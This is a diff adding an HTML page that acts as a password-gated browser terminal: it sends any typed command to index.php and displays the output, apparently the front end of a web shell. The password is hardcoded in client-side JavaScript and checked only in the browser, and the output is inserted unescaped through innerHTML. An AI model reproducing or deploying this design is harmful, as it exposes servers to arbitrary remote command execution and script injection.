@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Command Terminal</title>
+    <style>
+      body {
+        font-family: monospace;
+        background-color: #333;
+        color: rgb(255, 255, 255);
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        overflow: hidden;
+      }
+      .terminal-container {
+        width: 80%;
+        max-width: 1400px;
+        height: 60vh;
+        display: flex;
+        flex-direction: column;
+        border: 1px solid #555;
+        background-color: #000;
+        border-radius: 10px;
+        overflow: hidden;
+        display: none; /* Initially hidden */
+      }
+      .terminal {
+        flex: 1;
+        overflow-y: auto;
+        padding: 10px;
+        border-bottom: 1px solid #555;
+      }
+      .input-line {
+        display: flex;
+        padding: 5px;
+        border-top: 1px solid #555;
+      }
+      .input-line input {
+        background-color: #000;
+        color: rgb(255, 255, 255);
+        border: none;
+        outline: none;
+        flex: 1;
+        border-radius: 5px;
+        padding: 5px;
+      }
+      .input-line input::placeholder {
+        color: #555;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="terminal-container" id="terminal-container">
+      <div class="terminal" id="terminal"></div>
+      <div class="input-line">
+        <input
+          type="text"
+          id="command"
+          placeholder="Enter command..."
+          autofocus
+        />
+      </div>
+    </div>
+
+    <script>
+      const terminalContainer = document.getElementById("terminal-container");
+      const terminal = document.getElementById("terminal");
+      const commandInput = document.getElementById("command");
+      const password = "a1eg654aebh5a1rh654argv2a1e35g4vaeg";
+
+      function promptPassword() {
+        const enteredPassword = prompt("Enter password:");
+        if (enteredPassword === password) {
+          terminalContainer.style.display = "flex";
+        } else {
+          alert("Incorrect password.");
+          location.reload();
+        }
+      }
+
+      function executeCommand(command) {
+        fetch("index.php", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+          },
+          body: new URLSearchParams({
+            password: password,
+            command: command,
+          }),
+        })
+          .then((response) => response.json())
+          .then((data) => {
+            terminal.innerHTML += `<div>$ ${command}</div>`;
+            terminal.innerHTML += `<pre>${data.output}</pre>`;
+            terminal.scrollTop = terminal.scrollHeight;
+          })
+          .catch((error) => {
+            console.error("Error:", error);
+          });
+      }
+
+      commandInput.addEventListener("keypress", function (e) {
+        if (e.key === "Enter") {
+          e.preventDefault();
+          const command = commandInput.value;
+          if (command.trim()) {
+            executeCommand(command.trim());
+            commandInput.value = "";
+          }
+        }
+      });
+
+      window.onload = promptPassword;
+    </script>
+  </body>
+</html>
